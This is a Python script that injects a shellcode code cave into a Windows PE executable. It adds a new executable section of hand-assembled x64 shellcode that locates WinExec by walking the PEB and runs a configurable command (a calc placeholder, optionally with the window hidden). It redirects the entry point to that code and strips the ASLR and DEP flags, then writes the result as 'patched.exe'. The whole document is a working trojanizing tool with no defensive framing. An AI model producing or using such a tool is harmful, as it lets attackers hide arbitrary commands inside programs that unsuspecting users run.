import pefile
import struct
import os
import sys

# --- CONFIGURATION ---
COMMAND = "cmd.exe /c start calc"
REPLACE_ENTRY_POINT = True
SHOW_WINDOW = True
SECTION_NAME = ".cave"
# ---------------------

def u64(v): return struct.pack("<Q", v)
def u32(v): return struct.pack("<I", v)
def u16(v): return struct.pack("<H", v)
def align_up(val, align): return (val + align - 1) & ~(align - 1)

def build_code(cave_va, original_call_va, show_window):
    cmd_va = cave_va + 0x200
    c = bytearray()

    c += b"\x9C"
    c += b"\x50\x51\x52\x53\x55\x56\x57"
    c += b"\x41\x50\x41\x51\x41\x52\x41\x53"
    c += b"\x41\x54\x41\x55\x41\x56\x41\x57"

    c += b"\x48\x89\xE5"
    c += b"\x48\x83\xE4\xF0"
    c += b"\x48\x83\xEC\x20"

    c += b"\x65\x48\x8B\x04\x25\x60\x00\x00\x00"
    c += b"\x48\x8B\x40\x18"
    c += b"\x48\x8B\x70\x20"

    mod_loop_start = len(c)
    c += b"\x48\xAD"
    c += b"\x48\x96"
    c += b"\x4C\x8B\x46\x20"
    c += b"\x4C\x8B\x4E\x50"
    c += b"\x4D\x85\xC9"
    
    c += b"\x74" + struct.pack("b", mod_loop_start - (len(c) + 2))
    
    c += b"\x48\x0F\xB7\x4E\x48"
    c += b"\x48\x83\xF9\x18"

    c += b"\x75" + struct.pack("b", mod_loop_start - (len(c) + 2))
    
    c += b"\x41\x0F\xB7\x09"
    c += b"\x48\x83\xC9\x20"
    c += b"\x48\x83\xF9\x6B"

    c += b"\x75" + struct.pack("b", mod_loop_start - (len(c) + 2))

    c += b"\x49\x8B\xC0"
    c += b"\x8B\x58\x3C"
    c += b"\x4C\x01\xC3"
    c += b"\x8B\x9B\x88\x00\x00\x00"
    c += b"\x4C\x01\xC3"
    c += b"\x8B\x4B\x18"
    c += b"\x44\x8B\x4B\x20"
    c += b"\x4D\x01\xC1"
    
    exp_loop_start = len(c)
    c += b"\xFF\xC9"
    js_offset_idx = len(c)
    c += b"\x78\x00"
    c += b"\x41\x8B\x34\x89"
    c += b"\x4C\x01\xC6"
    c += b"\x81\x3E\x57\x69\x6E\x45"
    c += b"\x75" + struct.pack("b", exp_loop_start - (len(c) + 2))
    c += b"\x81\x7E\x04\x78\x65\x63\x00"
    c += b"\x75" + struct.pack("b", exp_loop_start - (len(c) + 2))

    c += b"\x44\x8B\x53\x24"
    c += b"\x4D\x01\xC2"
    c += b"\x41\x0F\xB7\x14\x4A"
    c += b"\x44\x8B\x5B\x1C"
    c += b"\x4D\x01\xC3"
    c += b"\x41\x8B\x04\x93"
    c += b"\x4C\x01\xC0"

    if show_window:
        c += b"\x48\xC7\xC2\x05\x00\x00\x00" # mov rdx, 5 (SW_SHOW)
    else:
        c += b"\x48\x31\xD2"                 # xor rdx, rdx (SW_HIDE)

    lea_idx = len(c)
    offset = 0x200 - (lea_idx + 7)
    c += b"\x48\x8D\x0D" + struct.pack("<i", offset)
    
    c += b"\xFF\xD0"

    c[js_offset_idx + 1] = len(c) - (js_offset_idx + 2)

    c += b"\x48\x89\xEC"
    c += b"\x41\x5F\x41\x5E\x41\x5D\x41\x5C"
    c += b"\x41\x5B\x41\x5A\x41\x59\x41\x58"
    c += b"\x5F\x5E\x5D\x5B\x5A\x59\x58"
    c += b"\x9D"

    # jump back to original execution flow
    jmp_delta = original_call_va - (cave_va + len(c) + 5)
    c += b"\xE9" + struct.pack("<i", jmp_delta)

    return c

def add_section(data, pe, name, content):
    file_align = pe.OPTIONAL_HEADER.FileAlignment
    sect_align = pe.OPTIONAL_HEADER.SectionAlignment
    image_base = pe.OPTIONAL_HEADER.ImageBase
    last_sec   = pe.sections[-1]

    new_rva    = align_up(last_sec.VirtualAddress + last_sec.Misc_VirtualSize, sect_align)
    new_offset = align_up(len(data), file_align)
    raw_size   = align_up(len(content), file_align)
    padded     = content + b"\x00" * (raw_size - len(content))

    hdr = (name[:8].ljust(8, b"\x00") +
           u32(len(content)) + u32(new_rva) + u32(raw_size) + u32(new_offset) +
           u32(0) + u32(0) + u16(0) + u16(0) + u32(0xE0000020))

    num_sec     = pe.FILE_HEADER.NumberOfSections
    opt_sz      = pe.FILE_HEADER.SizeOfOptionalHeader
    sec_tbl_off = pe.DOS_HEADER.e_lfanew + 4 + 20 + opt_sz
    data[sec_tbl_off + num_sec * 40 : sec_tbl_off + num_sec * 40 + 40] = hdr

    struct.pack_into("<H", data, pe.DOS_HEADER.e_lfanew + 4 + 2, num_sec + 1)
    new_img = align_up(new_rva + len(content), sect_align)
    struct.pack_into("<I", data, pe.DOS_HEADER.e_lfanew + 4 + 20 + 56, new_img)

    if len(data) < new_offset:
        data += b"\x00" * (new_offset - len(data))
    data += padded

    return data, image_base + new_rva

def patch():
    if len(sys.argv) < 2:
        print("Usage: python main.py <target_executable>")
        sys.exit(1)

    EXE_PATH = sys.argv[1]
    OUT_PATH = os.path.join(os.path.dirname(EXE_PATH), "patched.exe")

    if not os.path.exists(EXE_PATH):
        print(f"File not found: {EXE_PATH}")
        sys.exit(1)

    with open(EXE_PATH, "rb") as f:
        data = bytearray(f.read())

    pe = pefile.PE(data=bytes(data))
    image_base = pe.OPTIONAL_HEADER.ImageBase
    ep_rva     = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    ep_offset  = pe.get_offset_from_rva(ep_rva)

    dll_char_off = pe.DOS_HEADER.e_lfanew + 24 + 70
    dll_char = struct.unpack_from("<H", data, dll_char_off)[0]
    struct.pack_into("<H", data, dll_char_off, dll_char & ~0x0060)

    ep_bytes = data[ep_offset : ep_offset + 32]
    original_call_va = None
    branch_offset = None
    branch_opcode = None

    if REPLACE_ENTRY_POINT:
        branch_offset = 0
        branch_opcode = 0xE9
        
        if ep_bytes[0] in (0xE8, 0xE9):
            rel = struct.unpack("<i", ep_bytes[1:5])[0]
            original_call_va = image_base + ep_rva + 5 + rel
        else:
            original_call_va = image_base + ep_rva + 5
    else:
        for i in range(28):
            if ep_bytes[i] in (0xE8, 0xE9):
                rel = struct.unpack("<i", ep_bytes[i+1:i+5])[0]
                tgt = image_base + ep_rva + i + 5 + rel
                
                if image_base <= tgt <= image_base + 0x10000000:
                    original_call_va = tgt
                    branch_offset = i
                    branch_opcode = ep_bytes[i]
                    break

    if branch_offset is None:
        print("[-] Error: Could not find a valid location to hook. Try enabling REPLACE_ENTRY_POINT in config.")
        sys.exit(1)

    last_sec = pe.sections[-1]
    new_rva  = align_up(last_sec.VirtualAddress + last_sec.Misc_VirtualSize, pe.OPTIONAL_HEADER.SectionAlignment)
    cave_va  = image_base + new_rva

    sec = bytearray(0x500)
    code = build_code(cave_va, original_call_va, SHOW_WINDOW)
    
    sec[0x000:len(code)] = code
    cmd_bytes = COMMAND.encode("ascii") + b"\x00"
    sec[0x200:0x200+len(cmd_bytes)] = cmd_bytes
    
    sec_name = SECTION_NAME.encode('ascii') if isinstance(SECTION_NAME, str) else SECTION_NAME
    data, actual_cave_va = add_section(data, pe, sec_name, bytes(sec))

    if actual_cave_va != cave_va:
        code = build_code(actual_cave_va, original_call_va, SHOW_WINDOW)
        raw_sz = align_up(len(sec), pe.OPTIONAL_HEADER.FileAlignment)
        data[-raw_sz:-raw_sz+len(code)] = code

    hook_va = image_base + ep_rva + branch_offset
    jump_delta = actual_cave_va - (hook_va + 5)
    
    target_offset = ep_offset + branch_offset
    data[target_offset] = branch_opcode
    struct.pack_into("<i", data, target_offset + 1, jump_delta)

    with open(OUT_PATH, "wb") as f:
        f.write(data)

    print(f"[+] Code cave successfully written to section '{sec_name.decode('ascii')}'.")
    if REPLACE_ENTRY_POINT:
        print(f"[+] Replaced Entry Point directly at RVA: {hex(ep_rva)}")
    else:
        print(f"[+] Hooked instruction at RVA: {hex(ep_rva + branch_offset)}")
    print(f"[+] Target execution address: {hex(actual_cave_va)}")
    print(f"[+] Window State: {'SHOW' if SHOW_WINDOW else 'HIDE'}")
    print(f"[+] Output file: {OUT_PATH}")

if __name__ == "__main__":
    patch()
